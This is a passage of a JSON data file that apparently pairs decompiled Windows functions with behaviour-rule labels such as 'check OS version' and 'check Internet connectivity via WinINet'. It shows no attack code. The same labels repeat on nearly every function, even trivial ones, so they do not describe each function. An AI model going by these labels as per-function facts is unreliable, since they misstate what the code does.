*(in_EAX + 0x24) < iVar2) {\n                bVar1 = true;\n            }\n            else {\n                fcn.00459e88();\n                fcn.00459eb0();\n                fcn.00459e88();\n                fcn.00459eb0();\n                fcn.00459f70();\n                fcn.00459f04();\n            }\n        }\n    }\n    if (bVar1) {\n        fcn.00459b6c();\n    }\n    fcn.0045a244(0x45bd40, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 564
    },
    "0045c558": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0045c558(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint8_t in_CL;\n    char in_DL;\n    uint var_2ch;\n    uint var_24h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (in_DL == '\\0') {\n        if ((in_CL & 0x40) == 0) {\n            fcn.00418360();\n            iVar2 = fcn.0045a9c0();\n            if (iVar2 != 0) {\n                if (var_8h == 0x12) {\n                    fcn.00418360();\n                    fcn.0045bc3c();\n                }\n                else if (var_8h == 2) {\n                    uVar3 = fcn.00457a28(0x203, 0x203, 0);\n                    iVar4 = sub.user32.dll_PeekMessageA(&var_24h, uVar3);\n                    if (iVar4 == 0) {\n                        cVar1 = fcn.004047cc();\n                        if (cVar1 != '\\0') {\n                            (**(**(iVar2 + 4) + 0xd4))();\n                        }\n                    }\n                    if ((*(*(iVar2 + 4) + 0x8f) == '\\x01') && (*(*(iVar2 + 4) + 0x5d) == '\\x01')) {\n                        fcn.00450400();\n                    }\n                    *arg_8h = 1;\n                }\n            }\n        }\n        else {\n            fcn.00418360();\n            iVar2 = fcn.0045a9c0();\n            if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (var_8h == 2)) {\n                fcn.0044e1f0();\n                fcn.00450ac4(1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "0045c70c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c70c(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.0045bd64();\n        fcn.00418360();\n        *(in_EAX + 0x50) = var_ch;\n        *(in_EAX + 0x54) = var_8h;\n        fcn.0045c67c(&stack0xfffffffc);\n        fcn.0045bd64();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0045c75c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c75c(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char in_DL;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (in_DL == '\\0') {\n        if (*(in_EAX + 0x60) == 0) {\n            fcn.00418360();\n            iVar2 = fcn.0045a9c0();\n            if ((iVar2 != 0) && (var_4h == 0x14)) {\n                cVar1 = fcn.004047cc();\n                if (cVar1 == '\\0') {\n                    fcn.0044fbe4();\n                }\n                else {\n                    fcn.00441e1c();\n                }\n            }\n        }\n        else {\n            fcn.0045bc9c();\n        }\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "0045c954": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045c954(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x2c) != 0) && (*(in_EAX + 0x20) != '\\0')) {\n        fcn.0045ca94();\n        uVar1 = (**(*(in_EAX + 0x2c) + 0x2c))();\n        *(in_EAX + 0x28) = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "0045c9c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0045c9c8(void)\n\n{\n    return *0x497c98 != '\\0';\n}\n",
        "token_count": 27
    },
    "0045ca44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045ca44(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = fcn.00408600(in_EAX + 0x10, auStack8);\n    *(in_EAX + 0x18) = uVar1;\n    *(in_EAX + 0x20) = *(in_EAX + 0x1c) != 0;\n    return;\n}\n",
        "token_count": 106
    },
    "0045cab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045cab4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        fcn.0045c9f8();\n        if (*(in_EAX + 0xd) != '\\0') {\n            fcn.0045ca14();\n            return;\n        }\n        fcn.0045ca44();\n    }\n    else if ((param_2 == 0x68) && (*(in_EAX + 0x20) != '\\0')) {\n        if (*(in_EAX + 0xd) == '\\0') {\n            uVar1 = sub.user32.dll_SendMessageA(*(in_EAX + 0x18), *(in_EAX + 0x14), 0, 0);\n            *(in_EAX + 0x10) = uVar1;\n        }\n        else {\n            sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "0045cb18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045cb18(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint uMode;\n    \n    if (*(*0x492b04 + 0xc) != '\\0') {\n        uStack16 = 0x8000;\n        puStack20 = 0x45cb36;\n        uVar1 = sub.kernel32.dll_SetErrorMode();\n        uStack24 = 0x45cc7e;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (*0x497cb0 == 0) {\n            puStack20 = &stack0xfffffffc;\n            in_stack_ffffffd8 = sub.kernel32.dll_GetModuleHandleA_2(0x45cc8c);\n            *0x497cb0 = sub.kernel32.dll_GetProcAddress_1(in_stack_ffffffd8, 0x45cc94);\n        }\n        if (*0x491760 == 0) {\n            *0x491760 = sub.kernel32.dll_LoadLibraryA(0x45cca4);\n            if (*0x491760 != 0) {\n                *0x497cb4 = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45ccb0);\n                *0x497cb8 = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45ccc0);\n                *0x497cbc = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45ccd4);\n                *0x497cc0 = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45ccec);\n                *0x497cc4 = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45cd04);\n                *0x497cc8 = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45cd18);\n                *0x497ccc = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45cd30);\n                *0x497cd0 = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45cd48);\n                *0x497cd4 = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45cd64);\n                *0x497cd8 = sub.kernel32.dll_GetProcAddress_1(*0x491760, 0x45cd70);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        sub.kernel32.dll_SetErrorMode(uVar1, 0x45cc85);\n        return;\n    }\n    return;\n}\n",
        "token_count": 627
    },
    "0045cd80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045cd80(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497cb0 != NULL) {\n        uVar1 = (**0x497cb0)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0045cd9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045cd9c(uint param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar auStack20 [8];\n    \n    if ((*(*0x492b04 + 0xc) != '\\0') && (param_2 != 3)) {\n        if (param_2 == 0) {\n            uStack24 = 0x45cdcb;\n            fcn.0045cd80();\n        }\n        else {\n            uStack24 = 0x45cdd9;\n            fcn.0045cd80();\n            if (*0x491760 != 0) {\n                puStack28 = 0x45cded;\n                puStack32 = &stack0xffffffe8;\n                uVar1 = (**0x497cb4)();\n                if (uVar1 != 0) {\n                    puStack28 = &stack0xffffffec;\n                    uStack40 = 0x45ce04;\n                    uStack36 = uVar1;\n                    (**0x497cbc)();\n                    uStack44 = uVar1;\n                    if (param_2 == 1) {\n                        uStack40 = 0;\n                        (**0x497cc4)();\n                    }\n                    else if (param_2 == 2) {\n                        uStack40 = 1;\n                        (**0x497cc4)();\n                    }\n                    else {\n                        uStack40 = 1;\n                        (**0x497cc4)();\n                        (**0x497cbc)(uVar1, &stack0xffffffd4, &stack0xffffffd8);\n                        uStack44 = uStack44 & 0xfffffff4 | *(param_2 + 0x491760);\n                    }\n                    (**0x497cc0)(uVar1, uStack44, uStack40);\n                    (**0x497cb8)();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 449
    },
    "0045ce74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045ce74(void)\n\n{\n    uint uVar1;\n    \n    if (*0x491760 != 0) {\n        uVar1 = (**0x497cd4)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0045ce88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045ce88(void)\n\n{\n    fcn.00404640();\n    **0x49291c = 0;\n    fcn.00404640();\n    **0x492ad4 = 0;\n    fcn.00404640();\n    *0x497c54 = 0;\n    fcn.00404640();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x497c6a);\n    fcn.0040546c();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x497c68);\n    fcn.0040546c();\n    if (*0x491760 != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x491760);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0045d1f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d1f4(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar2 = *(in_EAX + 4);\n    if (iVar2 != 0) {\n        if (arg_8h != '\\0') {\n            *(iVar2 + 0x164) = 1;\n            *(iVar2 + 0x54) = *(iVar2 + 0x54) | 0x4000;\n        }\n        uStack28 = 0x45d2cf;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        cVar3 = fcn.00452824();\n        if ((cVar3 == '\\0') || (*(*(in_EAX + 4) + 0x30) == 0)) {\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h);\n        }\n        else {\n            arg_ch = arg_ch - (*(in_EAX + 0xc) + *(in_EAX + 0x14));\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h - (*(in_EAX + 8) + *(in_EAX + 0x10)));\n        }\n        *in_FS_OFFSET = arg_ch;\n        if (arg_8h != '\\0') {\n            iVar2 = *(in_EAX + 4);\n            *(iVar2 + 0x164) = 0;\n            puVar1 = iVar2 + 0x54;\n            *puVar1 = *puVar1 & 0xbfff;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 457
    },
    "0045d968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d968(int32_t arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x45daf6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00406a14(arg_1ch[2]);\n    iVar1 = fcn.00406860();\n    if (arg_1ch[3] < 1) {\n        if (-1 < iVar1) {\n            iVar2 = iVar1 + 1;\n            do {\n                fcn.00411a14();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    else if (-1 < iVar1) {\n        iVar2 = iVar1 + 1;\n        do {\n            fcn.00411a14();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (*(arg_8h + 4) != NULL) {\n        (**(**(arg_8h + 4) + 0x38))();\n    }\n    if (arg_1ch[3] < 1) {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.00411a14();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.00411a14();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    fcn.00406a14(0);\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x45dafd;\n    uStack40 = 0x45daf5;\n    fcn.00406a20();\n    return;\n}\n",
        "token_count": 638
    },
    "0045dd3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.0045dd3c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x44) != 0) {\n        return 3;\n    }\n    return *(in_EAX + 0x48);\n}\n",
        "token_count": 59
    },
    "0045ea14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ea14(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack244;\n    uint uStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    int32_t iStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    int32_t iStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint var_78h;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint var_68h;\n    uint lpBaseAddress;\n    uint hFileMappingObject;\n    uint hObject;\n    uint var_4h;\n    \n    uStack140 = 0x45ea29;\n    cVar1 = fcn.0040a1e4();\n    if (cVar1 != '\\0') {\n        uStack140 = 0x45ea39;\n        fcn.0045df60();\n        uStack140 = 0;\n        uStack144 = 0x8000080;\n        uStack148 = 3;\n        uStack152 = 0;\n        uStack156 = 3;\n        uStack160 = 0x80000000;\n        uStack164 = 0x45ea52;\n        uStack164 = fcn.004058fc();\n        puStack168 = 0x45ea58;\n        iVar2 = sub.kernel32.dll_CreateFileA_1();\n        if (iVar2 != -1) {\n            uStack172 = 0x45eb34;\n            iStack176 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff50;\n            uStack180 = 0;\n            uStack184 = 0;\n            uStack188 = 0;\n            uStack192 = 2;\n            iStack196 = 0;\n            puStack204 = 0x45ea86;\n            iStack200 = iVar2;\n            puStack168 = &stack0xfffffffc;\n            iVar3 = sub.kernel32.dll_CreateFileMappingA();\n            if (iVar3 == 0) {\n                *in_FS_OFFSET = iStack200;\n                uStack192 = 0x45eb3b;\n                iStack200 = 0x45eb33;\n                iStack196 = iVar2;\n                sub.kernel32.dll_CloseHandle_1();\n                return;\n            }\n            uStack208 = 0x45eb16;\n            iStack212 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff2c;\n            uStack216 = 0;\n            uStack220 = 0;\n            uStack224 = 0;\n            iStack228 = 4;\n            puStack236 = 0x45eab2;\n            iStack232 = iVar3;\n            puStack204 = &stack0xfffffffc;\n            iVar4 = sub.kernel32.dll_MapViewOfFile();\n            if (iVar4 != 0) {\n                uStack240 = 0x45eaf8;\n                iStack244 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff0c;\n                puStack236 = &stack0xfffffffc;\n                sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n                fcn.0045df84();\n                *in_FS_OFFSET = iVar2;\n                iStack244 = 0x45eaff;\n                sub.kernel32.dll_UnmapViewOfFile(iVar4);\n                return;\n            }\n            *in_FS_OFFSET = iStack232;\n            uStack224 = 0x45eb1d;\n            iStack232 = 0x45eb15;\n            iStack228 = iVar3;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        puStack168 = 0x45eb46;\n        fcn.0045e018();\n        *param_2 = var_78h;\n        param_2[1] = uStack120;\n        param_2[2] = uStack116;\n        param_2[3] = uStack112;\n    }\n    return;\n}\n",
        "token_count": 1020
    },
    "0045ec58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045ece8)\n\nvoid __fastcall fcn.0045ec58(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x45ed6f;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    fcn.0040546c();\n    iVar1 = 0;\n    fcn.0040546c();\n    if (-1 < (param_2 >> 1) - 2) {\n        iVar2 = (param_2 >> 1) - 1;\n        do {\n            fcn.0040634c();\n            if (pe_dos_header == 0x0) {\n                if (iVar1 == 0) {\n                    fcn.00405504();\n                }\n                fcn.0040546c();\n                iVar1 = iVar1 + 1;\n            }\n            else {\n                fcn.00405654();\n                fcn.00405738();\n            }\n            if (iVar1 == 9) {\n                fcn.0040546c();\n                iVar1 = 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x45ed76;\n    uStack52 = 0x45ed61;\n    fcn.00405490();\n    uStack52 = 0x45ed6e;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 439
    },
    "0045f150": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045f150(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x45f266;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    if (*0x4918a4 == '\\0') {\n        puStack24 = &stack0xfffffffc;\n        *0x497ce4 = sub.kernel32.dll_LoadLibraryA(0x45f278);\n        if (*0x497ce4 == 0) {\n            iVar1 = 0x45f294;\n            *0x497ce4 = sub.kernel32.dll_LoadLibraryA();\n        }\n        else {\n            fcn.00405784();\n            iVar1 = fcn.004058fc();\n            iVar2 = sub.kernel32.dll_GetProcAddress_1(*0x497ce4);\n            if (iVar2 != 0) {\n                *0x4918a4 = '\\x01';\n                goto code_r0x0045f24b;\n            }\n        }\n        if (*0x497ce4 != 0) {\n            fcn.004058fc();\n            iVar1 = *0x497ce4;\n            iVar2 = sub.kernel32.dll_GetProcAddress_1();\n            if (iVar2 != 0) {\n                *0x4918a4 = '\\x01';\n                *0x4918a8 = '\\x01';\n            }\n        }\n    }\n    else if (*0x4918a8 == '\\0') {\n        fcn.00405784();\n        uVar3 = fcn.004058fc();\n        iVar1 = *0x497ce4;\n        sub.kernel32.dll_GetProcAddress_1(*0x497ce4, uVar3);\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        uVar3 = fcn.004058fc();\n        iVar1 = *0x497ce4;\n        sub.kernel32.dll_GetProcAddress_1(*0x497ce4, uVar3);\n    }\ncode_r0x0045f24b:\n    *in_FS_OFFSET = iVar1;\n    iStack32 = 0x45f26d;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 548
    },
    "0045fe2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: hKey\n\nvoid fcn.0045fe2c(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    bool bVar4;\n    uint var_454h;\n    uint var_450h;\n    uint var_44ch;\n    uint var_448h;\n    uint var_444h;\n    uint var_440h;\n    uint var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_32fh;\n    uint lpReturnedString;\n    uint var_125h;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint32_t uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint uStack96;\n    uint uStack92;\n    uint *puStack88;\n    uint *puStack84;\n    uint uStack80;\n    uint *puStack76;\n    uint uStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint *puStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint *puStack40;\n    uint var_20h;\n    uint *nDefault;\n    uint *hKey;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x8a;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x46012c;\n    puStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    nDefault = NULL;\n    puStack44 = &fcn.0045fe2c::hKey;\n    uStack48 = 0x20019;\n    puStack52 = NULL;\n    uStack56 = 0x46013c;\n    uStack60 = 0x80000002;\n    puStack64 = 0x45fe6f;\n    hKey = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = in_EAX;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA_1();\n    if (iVar1 == 0) {\n        var_20h = 0x100;\n        puStack64 = 0x45fe82;\n        puStack68 = fcn.00402ef0();\n        puStack64 = &fcn.0045fe2c::var_20h;\n        uStack72 = 0;\n        puStack76 = NULL;\n        uStack80 = 0x46017c;\n        puStack84 = hKey;\n        puStack88 = 0x45fe9f;\n        nDefault = puStack68;\n        sub.advapi32.dll_RegQueryValueExA_1();\n        puStack88 = hKey;\n        uStack92 = 0x45fea8;\n        sub.advapi32.dll_RegCloseKey_1();\n    }\n    bVar4 = nDefault == NULL;\n    if (!bVar4) {\n        bVar4 = *nDefault == 0;\n    }\n    if (!bVar4) {\n        uStack92 = 0;\n        uStack96 = 5;\n        puStack100 = &fcn.0045fe2c::var_125h;\n        uStack104 = 0;\n        uStack108 = 0x45feca;\n        sub.shell32.dll_SHGetSpecialFolderPathA_1();\n        uStack108 = 0x45fee0;\n        fcn.004056dc();\n        uStack108 = 0x45fef1;\n        fcn.0045fb80();\n        uStack108 = 0x45ff04;\n        fcn.00405784();\n        uStack108 = 0x45ff12;\n        fcn.00405664();\n        uStack108 = 0x45ff23;\n        fcn.0045fb80();\n        uStack108 = 0x45ff36;\n        fcn.00405784();\n        uStack108 = 0x45ff3e;\n        uStack108 = fcn.004058fc();\n        uStack112 = *nDefault;\n        uStack116 = 0x4601d4;\n        uStack120 = 